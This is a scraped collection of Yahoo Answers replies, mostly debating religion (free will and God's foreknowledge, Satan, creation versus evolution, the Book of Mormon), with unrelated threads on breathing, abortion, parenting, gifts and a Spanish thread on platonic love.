But the future isn't a thing that can be known.    If it hasn't happened yet, it doesn't exist.  God finds out what we do when we do it, not before.    Therefore, free will is the basis of our relationship with Him.|`|ji7gqCWxaa	Men in their arrogance claim to understand the nature of creation, and devise elaborate theories to describe its behavior. But always they discover in the end that God was quite a bit more clever than they thought.|`|T5ztIAZbaa	That makes absolutely no sense.  We have complete free will, but God knows what WE will choose.    If a fortune teller were real, and they saw that someone would start working for McDonalds, that does not mean that the individual had no other choice.|`|3oCdTWYZaa	Omnipotence is itself a contradiction|`|AA11008046	God know all things, past, present and future.  We the human race use the god given freedom of choice to decide our destiny.  God doesn't stand over any one with a stick dictating to you how to live.  He has written in His Word the way He wants you to live.  However, if you choose to tear up the Bible and do things your way that is your choice.  God's desire is for all to make Heaven their end destination, but if you decide you don't like that choice then do your thing.  By the time you have gone through the gates to Satans domain (if that's it) I suggest you will have regreted your choice many times in the first minute.|`|f7fcb6877caa0ad4f41dd9af2258ee0aaa	God knows our choices because He has already seen them happen.  From His viewpoint outside of time, He views the totality of time simultaneously and eternally.  Therefore He sees every event, every free decision we make, every vibration of every atom in the universe, not linearly as we see time.  It should be obvious therefore that someone merely viewing us making choices, whether from a viewpoint in linear time, or from God's viewpoint outside of time, doesn't make those choices any less free.|`|AA11785285	No clue.  As well, I was never into sky daddy thing, so heaven is no place I'd even know about... dead is dead, isn't it?|`|KrdOKdJcaa	Because they don't understand that free will and omniscience aren't possible together.     EDIT: They claim things like, "foresight does not imply causation" using as an example, "I know that XXX is going to happen, but I'm not causing it to happen." But they don't realize that they don't KNOW that XXX is going to happen. They BELIEVE it will happen. Probability may even be in their favor, the odds may be 100 to 1 that they are right, but they do not have foresight. They cannot KNOW this. Omniscience/foresight is incompatible with freewill because if there was someone up there who KNEW everything that was going to happen, that would imply that there is nothing we can do to change it and we are on a predetermined course.|`|oC0HfFm1aa	Foreknowledge does not preclude free will.     For example, I know an atheist will post a snarky question about Christianity. That doesn't mean I'm forcing them to do it.|`|e058c73752697cb2225cc562af0316b3aa	that's stupid.    God just knows what your going to do, He doesn't force you to do it.    He didnt' make you  go to heaven or hell, He just knows what choice your going to make.    If you honestly think He makes us do things, did He make you ask that question, or rather make that statement?|`|O1b7das7aa	Objectivity (rationalization and logic) and subjectivity (faith and belief) DO NOT MIX.    You can not rationalize faith.|`|MF9YknDYaa	I am an atheist,however you are wrong,If I know in advance which of the two doors you will choose you still have free will to pick either door.|`|DI2VcAruaa	Wrong. Just because God knows what each human will ultimately choose does not change the fact that we have the free will to choose. For instance if you pay for a ticket to Chicago on a train, that train will deliver you to Chicago as long as you do not get off the train. In the same way God provides you a  ticket to heaven by his own death on the cross. You can jump off the train any time and in fact you don't even have to get on . But all that want to get on can.  This is free will. Because  God knows who is getting on the train and staying on the train and who is getting on, then off, or never getting on does not change the fact that the train is there for everyone who will.|`|Zzhgpe0Paa	Yes, it's true God knows the future. The key here is that you don't. You are not locked into a specific future because you can change it right now, or in five minutes. The fact that you don't know what your future decisions will always be is proof enough that you are the master of your own destiny.|`|MvZMA5BGaa	I understand that God knows this.  I also understand that Christians are called to pray as the result of obedience to God.  I like this.  And I love God.

Too many people are too far away from the catholic Faith, that is why there is such a lack of understanding from athiest, & fundies|`|cnPKAlDYaa	It's all true.    I've already had my rejection notice from St Peter.|`|bUJjjFinaa	Just because God is all knowing, it doesn't mean he wishes for us to do certain things (by certain things, I mean sin) and condemn ourselves to hell. We each have the privilege of free will, and may do as we please with our lives, but God yearns for a relationship with each of us. We are his children. But the Enemy has other plans, he'll do whatever it takes to distract us from God. Using lies, treachery, etc to corrupt us. ...The point of the matter is that although God IS omniscient, and DOES know each of our fates, we may still choose our own path in life, and ultimately in the afterlife. Choose wisely ^_-    ...I could emphasize my arguement until I'm blue in the face, but I'll leave it at this.|`|GC3qn1Aeaa	In theological thought, there is a difference between foreknowledge and determinism.  God knows what the future will be, but doesn't exert his control over the outcome of man's decisions.  The belief that man was created "in the image and likeness of God," requires that man, like God, has free will.    While God knows all things absolutely, it's possible for even man to have a pretty good idea about the outcome of someone's actions, yet be powerless to do anything about it.      Still, God has the power to cause or prevent any action or event.  That's simply part of what it means to be God.  The question remains, why does he allow man freedom?    The Christian must have much patience for paradox, something for which the Atheist has no need.      Yours in Christ, Nick|`|AA11521494	If he knows something will happen, that just means he can see into the future.  It's the doctrine of predestination and the existence of free will which are incompatible (though to be fair a lot of Christians don't believe in predestination).|`|9T0RAvDtaa	We have free-will because God has given us free-will. God has allowed us to do whatever we like during our lifetime, but that doesn't mean we won't be responsible for our actions. The choice to do right over wrong is what allows us to be rewarded for our actions. If nobody believed that they would be held accountable for their actions, then who would feel compelled to do the right thing?     Anyways, just because God knows what we have done, are doing, and will do in the future, does not mean we do not have conscious decision to do what we want.|`|AA11955868	I didn't know God knew until you died?    Anyway, why can't God be a psychic? You make all your little choices (your free will) and he sees the result. Just because he knows the result doesn't mean he knows how you got there.     You don't know that you're going to heaven or hell, so you aren't worried about changing what God knows, so your will is all willy nilly.     Maybe. I dunno *shrug*|`|7422ddf097669bd7b6e3d48e56258b87aa	http://douglawrence.wordpress.com/2009/0...|`|1sB6N5sEaa	God does not chose are way of life.  We choose our own way. The Bible is the guide by which christians are supposed to follow, but very few actually do.      God has NOT predetermined who will be saved and who will not. We have the free will to follow his guide or ignore it.    The only thing God knows the out come of are the things he personally fortells will happen not individual things.    The so called christians that say God has pedestaned our lives do not know the Bible

If you've made bad decisions, you can expect them to come back and bite you.

EBGdlo35aa	The bible only says that Satan can appear as an angel of light.  It does not say if that is the *only* form that he can take, or if any other forms are available to him.

Some illiterates are can be seen as lazy but may want to change this. In conclusion, illiterates can vote as long as they actually understand.

I've seen the best of people die of cancer young, and the worst sociopaths on earth live a long healthy life.  I don't think we'll ever understand the seeming inconsistency of that.

God warned them many, many times, and yet they still chose to do evil things, over doing good.     Like any parent, God wants His children to love Him and willingly turn from wrong, to choose good over evil.  And do it on their own.    Babies are without sin, and are in heaven with God.    We have the power to say no to evil and sin and choose good. The devil may tempt you to steal or whatever, but we have a conscience that lets us know when something is wrong, as well as laws, we are not forced to do bad things.    Question: Does it make any sense, for people, to keep doing evil/bad things to each other when God has clearly told them to turn away from evil/sin and do what is good??  ESPECIALLY, after the flood?     Why keep doing what God clearly said not to do. They've seen the wrath of God Is it not enough that He wrote the Commandments in stone? To KEEP sinning, after being warned, by your own Creator that you'd all be destroyed if you kept doing it, and delierately ignoring God, now THAT, doesn't make sense to me,           As for Satan, he and his angles will be destroyed on Judgment Day, along with all who choose to do evil.|`|46e820e9ba704c6776305bf6a1b991efaa	Satan told Adam and Eve that they did not need God to rule over them.  That they could rule themselves.  God could have destroyed Satan right away and the two humans.  But God had already given Adam and Eve the command to fill the earth with humans. Satan never said that God was not powerful.  Just that he did not have the right to rule over mankind.  If God had destroyed them all, what would that have proven? That maybe they were right and the only thing God wanted was puppets to obey him.  He was saddened by Adam and Eve's decision but allowed them to try to rule themselves.  This was an important issue.  One that had to be resolved.  Satan brought into question God's right to sovereignty. God took his protection away from Adam and Eve and put them out of the garden so that they could not eat of the fruit of the tree of life and keep living forever.  If God had continued to protect these humans would it not seem to them that they could indeed live without God?. Adam and Eve and their offspring have tried every sort of government and the world keeps getting worse every day.  People get sick and die.  No government can give people eternal life and happiness.  Soon God will take back rule of the earth from Satan and humans.  He will destroy all the evil and restore the earth to the paradise he started with in the first place.  All those who have suffered and died in this system will be resurrected to his new earth. If they allow God to rule over them once again, they will never have sickness, pain or death. The right to rule over mankind will have been settled once and for all time.     In the past when God brought destruction on mankind, those people were judged evil. Even the children would have grown up to be evil.  If God had not destroyed them, humans would have ceased to exist.  God's plan for obedient mankind would have ended.  This was not fair to all those who had no choice but to suffer and die in this system.|`|jCFxWmenaa	its a little hard for something that doesn't exist to destroy anything|`|5ifHSNSraa	Cause fallen angels can only go as far as God allows them to go.

You raise a valid, and quite interesting point. Keep in mind the following is my personal take on it, do with it what you will:  God created Lucifer to be an angel and do His bidding. When Lucifer rebelled..Well, let me back track. God knows what you're going to do before you do it. This does not mean you do not have freewill. It is my personal belief that God sees the many paths laid out for an individual and knows what acts will take you down which path. This goes for humans and angels. When Lucifer rebelled, God knew he would bring about the downfall of humanity, and knew that He had to let it be so. God had a reason for allowing Lucifer to continue in his existence, reasons that we, as humans, are not fully capable of understanding. Also keep in mind that in the Book of Revelations, it says in chapter 20, verse 14, "Then death and Lucifer were thrown into the lake of fire. This is the second death, the lake of fire." God has a plan for Lucifer, and his followers. As with everything else in life, this too will come in its own time.   As for your thought that God is destroying humans...He is not destroying humans. When God flooded the Earth, He made a promise to Noah, saying He would never again cause flood waters to cover the Earth. He then made a rainbow as a symbol of His promise. God is merely reacting to the sins of humans, and humans are therefore in effect destroying themselves through pollution, murder, warfare, and other various sins for which God has promised punishment. Think of it as a stern, but loving, parent correcting a disobedient child.   Hope that helps! :)|`|Xcri5qeTaa	Doesn't make sense to me either. Devi tempts but God kills.

I became a Christian years ago through looking at the scientific evidence, and I'm used to looking through things thorroughly and get easily deterred by preachy language and bias. Read that book recently, and it gives very solid evidence on Geological, Biological and Physical reasons why evolution doesn't work, and also a lot of evidence for a young earth creation. Every page is thorroughly referenced to studies and journals, and a third of the book is Appendices.    I know you don't know me, but I pick faults very easily. I was shocked I couldn't find a fault in the logic at any point in the book. Written from a young-earth pov, but in a very accessable, neutral manner.|`|zPfgFXU5aa	It depends on how you interpret the evidence and that depends on what presuppositions you bring to the table.    Both creation and evolution are built on fundamental assumptions.     Creationists do not deny having a starting point of Scripture and interpreting any scientific evidence in that framework.     But evolutionists have a starting point too; their materialist assumption that miracles are impossible and that all phenomena must be explainable through natural processes forces them to interpret facts in a certain way.     So both sides have biases; evolutionists just normally fail to acknowledge theirs.     Science cannot disprove that we're here by creation, but neither can science prove the alternative which is we're here by chance or macro-evolution. No one has observed either. They are both accepted on faith. The issue is which faith, Darwinian macro-evolutionary theory or creation, has better scientific support.     Big Bang cosmology and the Second Law of Thermodynamics show that the physical universe had a beginning. This gives us two choices and only two choices: either everything came from something outside the material universe, or everything came from nothing.        Atheists have opted for the 2nd option,  which means they believe (but have never proven) that nothing produces everything; non-life produces life; randomness produces fine-tuning; chaos produces information; unconsciousness produces consciousness; and non-reason produces reason.    Why?     What makes that a more reasonable alternative than the 1st option?     How does the atheistic worldview account for the totality of the evidence better than the Creationist worldview?    If truth is dependant on vote of scientists then we are in big trouble because if you go back in history many things taught by science in the past have turned out to be wrong and no doubt there are things that science believes today which will have to be revised in the future.|`|HsbDGCY6aa	yes, but its written in a language that has not been deciphered just yet...please check back next week|`|7sqpiGgoaa	nope nothing, yet there are people who still deny evolution|`|88adf0621d46a4d78324d57cbb47b1ceaa	nope I would probably space the question out a bit more they need to learn scientific method.|`|YZv8Ub3Haa	Sure, there is a lot of it.

EE9F6q3Jaa	i don't know.  but i think it's because they're too scared to live life by themselves.  they're to scared to be on their own and they have to think of something to rule over them. They have to follow a leader.  they can't make things happen on their own, so they pray to something else (a higher power) to make things happen for them      it's like why do people believe in heaven/hell, afterlife, or ghosts?  because they're to afraid to accept the fact the things are gone.  they can't grasp the concept of never living again, not being able to take another breath.     i personally don't need anything else to survive.  i believe in myself and i know that if i want something really badly, i will make it happen on my own.  i don't need reassurance from a higher power.|`|sW6lxVFOaa	They have been indoctrinated into it early on and do not have enough courage or intelligence to ask the tough questions about it.|`|u33x2hqzaa	One never really knows what other people think.

But that can't be the only reason as there has always been magic/cloning to defeat death.     I believe its because none of the other theories make as much sense as that of religion and have far more contradictions than signs and probably because of that for centuries believers of God have been more faithfully accepted than those who denied.    I believe those who are better they always win and prosper. The history is the proof.|`|AJuhj397aa	because people feel the need to have meaning to there life and they are raised to believe in god so they don't know eny different.|`|1OpcR7bZaa	Their parents make them believe in God and they grow up in a society where they have to believe otherwise they will be an outcast.|`|de2AwHpHaa	because people go through or watch loved ones go through suffering.  it would be nice if it wasn't all for nothing.|`|DdYTRUmHaa	So that when someone dies everyone can think it's okay and that they're in a "better place"....yeah ok.    hmm..indoctrination would make sense too, but people (like myself) can grow out of that. some people choose not to question god because they're scared, i know that was MY problem when i was younger ha (raised catholic, btw)|`|Eo7KcX3Waa	Everyone believes in God...even the demons believe that there is a God , that means nothing...|`|FmbwIbtzaa	We all know that there dwells within the human mind a fragment of God, and that there sojourns with the human soul the Spirit of Truth; and we further know that these spirit forces conspire to enable us to grasp the reality of spiritual values and to comprehend the philosophy of universe meanings. But even more certainly we know that these spirits of the Divine Presence are able to assist us in the spiritual appropriation of all truth contributory to the enhancement of the ever-progressing reality of personal religious experience--God-consciousness. We know this even if some are not able to say it as it is.

I've lived in the streets, slept in dark alleys and feared for my safety. I've known hunger, addiction, abuse, the loss of a child. I've known illness, and pain. Have gone from able-bodied and strong to watching my mobility slowly and steadily drifting away. I've known great poverty, loneliness, and despair.    I've also enjoyed a wonderful, fulfilling life of immense  happiness and health. I've learned gratitude and  hope. I've experienced the joy of raising my children and  watching them grow. I have so much to be thankful for.    Would I change places with someone less fortunate? Go back to that place for just a few weeks?    Yes, I'd do it again. I survived it once. It would be a reawakening  for me, another chance to once again appreciate all that I've got.     For all the things I've experienced and learned, for all the things I've overcome, there are times when I take it all for granted. A reminder of what has been,  and what once again could be,  might not be such a bad thing.     I lived that for years. I could do a few weeks.

pLlnLrhTaa	The child did not commit sin but was born into sin as we all were.  When Adam and Eve ate the fruit from the tree of good and evil, they allowed sin into the world and changed a perfect world into an imperfect one.  Since humans must operate in a world of sin, deformities and other genetic mishaps will happen and continue to happen until Christ's return.      Just because a child is born with no arms or no legs or blind or deaf or whatever the challenge does not mean it is the end.  There are many people with challenges who have had fruitful productive lives (Helen Keller, Stevie Wonder, etc.)  Those who respond that they would abort the child are heartless, cruel, and very short sighted.|`|IIhiSprlaa	None, and a fetus expected to be born without limbs should be aborted.

The only ones that are qualified to answer will be those who have studied - not merely read - both volumes, each of which are considered scripture bu some or all Christians.    I have a Book of Mormon, and also many Bible versions, and from them I will make answer, less to the question than to those answers that dismiss either one or both volumes.  The majority of answers are from those not familiar with one book or the other, and their contributions add up to a list of opinions.    Judging without any case without sufficient evidence is more likely to result in a miscarriage of justice and the condemnation of the innocent.    For example, to test the 'accuracy' or 'truthfulness' of both books one must be reasonably conversant with both books, so that an answer can be given based on studies in each of the two book, and a sound conclusion reached  through comparison and contrasting to make a sound judgement of whether of the two is the most truthful.    If we wish to compare both books in translation against their original mopnograms we are obstructed because neither book's primary documents are available to us.  Therefore we must use whatever versions we have at our disposal.    There is much in the Bible and the Book of Mormon that is believed by the faithful, but is questioned by the less attached, and rejected out of hand by non-believers. That condition is 'normal,' and nothing for us to become excited about.    Truth is truth wherever it may be found and whoever said or wrote it.  A truth in the mouth of an habitual liar does not, thereby, become a falsehood.    Both Bible and Book of Mormon say that God lives and is concerned and involved in human salvation.    Both volumes either presage or announce the Messiah that comes to make humanity sinless by way of his infinite atonement.     Both volumes speak to the sinful nature of man, but promise cleansing from the consequences of sin through the Atonement.      Both volumes speak of King Zedekiah.    Both volumes speak of the coming destruction of Jerusalem [by Babylon].    Both volumes speak in similar terms of a Christian eschatology including universal resurrection and judgement.    I could go on, but the list would be far too long to be of interest to any but a few souls who are interested in such comparisons.    The center of Christianity is belief in the Incarnation of God's Only Begotten Son; his teaching about salvation; his salvic death; and his literal resurrection after three days.  All else is commentary.    The question could well have been whether of the biblical testaments is more accurate, ie, is one the Old T as truthful as the New T?    A further question on which opinions vary is, 'Are the two Books of Kings are as truthful as the two Books of Chronicles?      &c.

Most LDS consider the book truthful and accurate. There are things written in the Book of Mormon that are not there in the Bible. Members believe that many things were lost out of the Bible and that the Book of Mormon is from another group of people, one of the scattered tribes of Isarel that was broken off and that their work was kept unadulterated from the religious councils who determined what was and what wasn't suppose to be in the bible. Therefore we consider it more accurate.     Do we consider the bible unimportaint because the Book of Mormon is more accurate? No, we consider both as helpful tools in learning the Gospel of Jesus Christ.|`|QYu8KrXTaa	Hi, The bible is accurate on history, archeology, science, astronomy etc when examined truthfully. It also has the answer to our situation on earth today. The Bible has not been changed. It has been translated into more languages than any other book, It was the first ever printed. There are many versions today but if you put them side by side you can see they are saying the same thing using easier words(except the New World translation of the JW's which is deliberately changed to teach their errors.The SDA one is way off too.)  The book of Mormon doesn't qualify anywhere.Other problems: 1.The content of the Book of Mormon contains detailed discussion about  current (1820s) social, political and religious concerns not expected in the translation of a 1400  year old Egyptian text. It includes the story of the Nephite Jews from 600 B.C. to 421 A.D.   migrating to America. The American Bureau of Ethnology advised that there is no evidence  Nephite Jews ever existed and no Jews ever migrated from Israel to America. They also state  pre-Columbian Indians had no knowledge of the Bible nor Christianity.   2.  Plagiarism - the copying of other writing and claiming it as original. It contains  much of Ethan Smiths book, View of the Hebrews (1823) and 1000s of words from the King  James Bible (translated first in the 1600s). The Tanners listed 400 verses and portions of K.J.V.  New Testament in their book The Case against Mormonism. as well as K.J.V. textual errors  still there. No alarm here to K.J.V readers. It is true the 1611 version is not being used today as a  number of small translation errors and mistakes did occur. It is a perfectly good Bible but we  need to remember it was the original manuscripts that were inspired by God without error. In  2Nephi 14:5 from Isaiah 4:5 the word defence should be canopy. and in 2 Nephi15:25  (Isaiah 5:25) torn should be refuse. If it was an inspired translation there would be no errors.  Certainly there are some variations in  English Bible texts but the translators are not claiming  inspired translation. These variations are because of language change and some archaeological  finds clarify some old words which have been corrected.  Now archaeology is an embarrassment  to Mormons in spite of their claims.  A claim is made by the Mormon Church that the  Smithsonian Institute and others have used the Book of Mormon as an archaeological guide.  They have received so many enquiries about this that they have produced a standard form letter  denying it which is sent to all enquiriers. There are more  similar errors and  contradictions  involving the other inspired Mormon books, Doctrine and Covenants and Pearl of  Great Price. I have been told they believe "the end justifies the means" that is they can tell you anything as long as you become a Mormon. They also don't tell you their strange teachings until you are well hooked. nev r.|`|SEBcylvuaa	its even more...off than the bible|`|UD7d70awaa	nope|`|7ff82885c9d5d1f343a4664e9d97a78aaa	The Mountain meadows massacre was not accurate, they though the people they slaughtered were someone else.|`|aMdLmbRwaa	Not to me it's not.

It is riddled with inaccuracies due to the ignorance of its author Joseph Smith, who assumed that old world archaeology also applied to the new world. As a result...    The Book of Mormon claims that:    1. The pre-columbian inhabitants of the American continent had horses & military cavalry units - Wrong. Horses were introduced by the Spaniards in 1492.    2. The pre-columbian inhabitants of the American continent had metal weapons - wrong. Metalworking (apart from goldsmithing) was also introduced by the Spanish.    3. The pre-columbian inhabitants of the American continent had carts & the wheel - wrong. Also introduced by the Spanish.    These all point to one thing. It is fiction & was written by someone completely ignorant of new world history & archaeology.|`|yakmXr5Jaa	Accurate doesn't mean the same thing as truthful.    The LDS claim about accuracy is just based on the fact that the Book of Mormon was translated by revelation from God.  Whichever translation of the Bible you read, it was translated by gifted scholars who have studied and researched and deserve an incredible amount of respect, but that's not the same thing as revelation.    The Book of Mormon is not any more truthful than the Bible.  The Bible is the word of God.  But so is the Book of Mormon.  It contains ancient scripture written on the American continent and it proves the Bible is true.  If you accept the Book of Mormon and the story about how it was translated and given to our day, you can no longer even doubt the fact that Jesus Christ was very real and He is the Saviour and Redeemer of the world.|`|Kwfo0aRvaa	Since the Book of Mormon claims to be an historical document it can be examined on that basis to determine its authenticity.     The Book of Mormon claims to be the record of three groups of people who emigrated from the Old World to the New World long before Columbus. One group of Hebrews supposedly arrived about 600 BC. The scribe for this group wrote: "I make a record in the language of my father, which consists of the learning of the Jews and the language of the Egyptians" (Book of Mormon, Nephi 1:2). These records were supposedly maintained on gold plates, later buried in the Hill Cumorah (in upstate New York). An angel directed Joseph Smith to their location where he was permitted to unearth them. After Smith finished his translation the plates were returned to the angel.    It has been over 170 years since Joseph Smith first published the Book of Mormon. To date, there is not one artifact that can be identified as being made by the people of the Book of Mormon. Also, there is no official map designating the location of any Book of Mormon city. Joseph Smith preserved an example of the supposed writing on the plates. No other sample of such writing has ever been found in the Americas. The Mormons point to the great Mayan ruins to establish that there was at one time a great civilization in southern Mexico and Guatemala. However, the Maya had their own pagan religion and history that has no connection to the supposed Book of Mormon people. (Utah Lighthouse Ministry http://www.utlm.org/faqs/faqgeneral.htm ...    Let me now state uncategorically that as far as I know there is not  one professionally trained archaeologist, who is not a Mormon, who sees any scientific justification for believing the foregoing to be true, ...  nothing, absolutely nothing, has ever shown up in any New World  excavation which would suggest to a dispassionate observer that the Book of Mormon... is a historical document relating to the history of early migrants to our hemisphere. (Michael Coe, Professor Emeritus, Yale University, Dialogue: A Journal of Mormon Thought, Summer 1973, pp. 42, 46    Many people assume that if they read the Book of Mormon they will get a good idea of LDS beliefs. However, the Book of Mormon teaches one God, not plural gods as in Mormonism. It mentions heaven and hell, not three degrees of glory, no temple marriage or secret temple ceremonies. It does not teach baptism for the dead, pre-existence of man, eternal progression or polygamy. One of the most objectionable doctrines in the Book of Mormon is its view of skin color. White skin is seen as desirable, dark skin is seen as a mark of God's displeasure. Smith wrote the Book of Mormon in the late 1820's. Over the next fifteen years his doctrines underwent radical changes which are seen in his revelations in the Doctrine and Covenants and the Pearl of Great Price.|`|AA10637643	It is a second witness to the bible, that Jesus is the Christ.    The Book of Mormon more clearly explains the certain doctrines of the gospel that are either not clear in the bible or that have been left out.  More accurate?  Not necessarily.  Most correct?  Yes.

On the other hand my mother has chronic airways disease and is prone to panic attacks learning breathing exercises is helping her to control her anxiety (sometimes)|`|XzksQ3AFaa	When people suggest "breathing" in response to stress, anger, pain, etc. they don't mean simple respiration (inhale, exhale, continue living). They mean a specific type of breathing called diaphragm (or deep) breathing.    All humans are born diaphragm breathing naturally, and we continue to breathe from our diaphragm as children. By the onset of puberty, however, most people stop breathing from the diaphragm and start "chest breathing" instead. Chest breaths are much shallower and don't fill the lungs as completely as diaphragm breaths do.    In case you don't know, the diaphragm is kind of a muscle (it's like a trampoline) that separates your lungs and heart from your stomach, intestines, bowels, etc. When you chest breath, you don't use your diaphragm to pull air into your lungs. When you deep breathe, you are using your diaphragm to essentially "grab" air and force it deep into your lungs, filling them completely.    Deep diaphragm breathing can help reduce stress and pain by better oxygenating your blood. More oxygen in the blood means more oxygen in the organs, like the heart, brain, intestines, etc. The more oxygen these organs have, the better they can work. When they are able to work more easily and with less stress, it makes you feel better. Less stress on your body = less stress on your mind.|`|kmTnIuL2aa	Taking a breath gives your brain that one second to realize "I may be mad, but I probably shouldn't do something stupid."

If you're angry breathing can help clear the mind and figure out how fast you have to run after u punch somebody so that they won't catch you... or it gives you time to make the decision whether or not that would be a good thing to do.   If breathing isn't helping you clear you're mind it's because you're not letting it.   If im not helping at all, Try yoga. I think that will help you understand a little bit better how breathing is significant.
BjYG2yxtaa	Si....Y sabes lo peor de que sea un Amor Platónico, que pasan los a?os y lo sigue siendo. Cuando me enamoré de él, yo tenía 13 a?os y él 30, la vida se me iba por una sonrisa suya, porque me hablara 5 minutos, porque me diera un beso en la mejilla....Dios! recuerdo haber hecho tantas locuras por verle un instante...Ahora tengo 24 a?os y él sigue siendo mi gran amor platónico, con la diferencia de que yo he madurado, he tenido más amores....pero le he visto casarse, le he visto tener un hijo, y esas cosas siguen pesando en mi corazón, porque desgraciadamente mi vida pasa y le veo envejecer al lado de otra persona que no soy yo...Y por más que digan que el amor no tiene edad, es mentira, si cuando le conocí el hubiera hecho algo, ahora estaría en la cárcel, y ahora que podría pasar, un hijo pesa demasiado en mi cabeza, por eso yo no le confieso todo aquello que siento...Los amores platónicos tan bonitos y tan amargos al mismo tiempo!! En fin...mucha suerte! ;-)|`|VmnyKRFCaa	Si, creo que todos hemos tenido un amor platónico, pero sinceramente el que yo tengo no lo comparo con otro he tenido muchos novios pero aun así ese chavo me sigue gustando me trae vuelta loca, me da alas luego me las corta bien feo, por eso digo que es un amor platónico.|`|147a8fe6b1831f006aaded5a34af3cbcaa	han sido tantos.... pero el primero de mis amores platonicos dejo de serlo hace mas de 3 a?os... ahora somos pareja...|`|b7Qyw3jRaa	si, 2, per no quiero decirlo, pues lo prometi, creo que son correspondidos, pero siempre que les hiba adecir ese mismo día se habian hido a vivir a otra parte ( hace 8 a?os y el reciente hace2 a?os)|`|d9e03f0d9faceec926cfe268f34c4bcaaa	y quien no???? yo por lo menos si era un chico mayor que yo que siempre he dudado que supiera de mi existencia|`|f8YGyBGdaa	si!!! cuando tenia como 13 a?os un vecino que tenia como un a?o mas que yo, me encantaba pasaba horas mirando x mi ventana o esperando que el pasara yo creo que los dos nos gustábamos pero nunca nos atrevimos a hablarnos para mi fue un amor platico ya que nunca se concreto y siempre lo mire de lejos jajajjaja!! pero ya paso ahora tengo 20 a?os y aun lo veo  y me acuerdo de  cuando era mas chica y me da risa. en fin saludos|`|izHVddG4aa	siii, Luis Roberto Guzmán, esta buenisiiimoo, alguien lo conoce??|`|rwVJkHO4aa	Sí que los tuve y tres de ellos gracias a Gabo.

I hate to think this but as I read the open questions in other areas of Yahoo Answers from the teenagers, I see such ignorance and such self absorbed young people.  Drugs, suicide and sex is what they think about.  Not education and family and country as we were taught.

None (or very very few) parents are setting examples of, or teaching about honor today as far as I can see.      It seems to be all about 'winning' no matter what the cost/price.  Whether they feel compelled to cheat or do something underhanded to win.      A full day's work for a full day's pay (or sit at the computer at work and view porn and play games)  or sneak off somewhere and visit and smoke and sleep.     A restaurant kitchen where food is dropped on the floor and used anyway, or spit on for revenge to the customer they don't like.    Not cleaning the hospital rooms correctly after contagious patient leaves because there are   too many on the list to get done that day.

I can tell you this, my daughter and/or my son would not want to abort.  Why do I know this? We have had this conversation many times.  They are both adopted and both of their birth moms had people in their lives that thought they should abort.  My 2 children are here because of a pro-life mother. So am I? I am adopted as well.  I know that some Christians have had abortions.  I counseled enough women over the course of 10 years to realize this- however I also know a lot of non-Christians don't want to tell their parents either. One more thing, not everyone that calls themselves Christians are Christians.|`|jBYxEX8taa	Firstly, there are many other religions, not just Christian. Secondly, nobody is perfect.

When my son started dating, I bought him a pack of condoms and told him that while I discourage him from having sex, I am not naive enough to think it may not happen so I expected him to use them. When my daughter started to date, my wife had the same conversation with her and made her see a doctor and get a prescription for birth control pills. I'm sure there are many Christians who would condemn us but they are both well adjusted adults now and neither contributed to an increase in the abortion rate in this country.    70% of induced abortions in the US are performed on Christian women.|`|mSFjbetxaa	I am not a Christian, thank God.    I know that my son could tell me but I have taught him since he hit puberty the necessity for condoms, so it better not happen.|`|VRl1jENHaa	1)  Absolutely not.  I know they would tell me.    2)  "the number of abortions per year doesnt match the number of atheists..."  And why do you assume that all people not labeling themselves atheists must, by default, be true Christians?  (And btw, most people calling themselves Christians nowadays don't read the Bible, pray, follow God's commandments or attend Church; therefore, they are non-religous and NOT Christian.)|`|mC4mnvGFaa	isn't it hilarious at how fast you got the  "those people aren't really christian" thing!

xZ1GD4zbaa	I would say I've noticed the church at large is getting luke warm once again. Things are just as bad if not worse spiritually just prior to 9/11.    But I believe that the next tragedy to hit America will not humble us, but it will make the godless that more angry at God for not giving them their way any more.    A revival will sweep the land, but while those who are called by God's name will hear the call, those who reject God will become darker and darker still.|`|wzqahEqiaa	I assume your talking about the United States.  I believe the youth think religion is more important than their parents do.  In some ways the country is becoming more secular and in other ways I think people are rediscovering old traditions.

Quit blaming murderers for "Satan's" work. It was their choice.     "Satan" is a mixture of the Pagan gods   1)Pan, half goat god of wine, partying, fertility, wild sex, music   2) Egyptian god Set, who symbolized making wrong choices based on your own wants and selfishness. he was totally out of balance.

If we were supposed to die, believe it or not, our Creator would have put that in to our thoughts.  He is a God of Love and wants all his creation to live, not die, for also he is a God of the Living - not the dead!     Firstly, we only use half of our brain!  Secondly, our bodies are made to heal itself, so why do we grow old and die?    The answer is all in the bible, the Word of our Creator.

As for your question:    Supernatural explanation:  Satan isn't stupid enough to cause people to be demon-possessed in developed countries when he can get them to be atheists with little effort.  Demon-possession would, obviously, be counter-productive to his deceptions.  In third-world countries, and other places that strongly believe in a spiritual world, demon-possession makes far more sense.    Atheistic explanation:  People who believe in the supernatural are more likely to attribute coincidental events to the supernatural than those who do not.  If an area has more supernatural sightings, it's probably because there are more religious folk or less educated people living there.|`|16916096b289948e0c50f1b326de159aaa	I think people attribute the supernatural with scary places, ie abandoned houses, old castles, dark wooded areas, etc. So naturally these places are equated with the supernatural and would have a higher probability of being areas of high supernatural traffic.|`|TinNG7k7aa	More lunatics in certain areas I suppose.|`|rFFYCmOGaa	Actually such beliefs are not uncommon in hospitals.|`|AA10043552	Genetics, bad water, too much availability of alcohol, republican majorities...

To the unbelieving materialist, man is simply an evolutionary accident. His hopes of survival are strung on a figment of mortal imagination; his fears, loves, longings, and beliefs are but the reaction of the incidental juxtaposition of certain lifeless atoms of matter. No display of energy nor expression of trust can carry him beyond the grave. The devotional labors and inspirational genius of the best of men are doomed to be extinguished by death, the long and lonely night of eternal oblivion and soul extinction. Nameless despair is man's only reward for living and toiling under the temporal sun of mortal existence. Each day of life slowly and surely tightens the grasp of a pitiless doom which a hostile and relentless universe of matter has decreed shall be the crowning insult to everything in human desire which is beautiful, noble, lofty, and good.

ab110b9f3640ae6b77fd1c94d0cb323faa	Most guys get awkward when receiving gifts probably just as much as girls get when giving them, especially when they're just friends. It's a masculine thing. I say, to make it less awkward, make it fun. A kiss on the cheek! That's unique no? Unless he's the type of guy that can get that easily. Friends can kiss friends on the cheek and not get awkward. And it fits well with the Valentine theme. A card is not a bad idea, because it's the thought that would count, not the card it self to be honest. I don't think guys are a great fan of cards but cards are one of the best gifts to show you're meaningful.

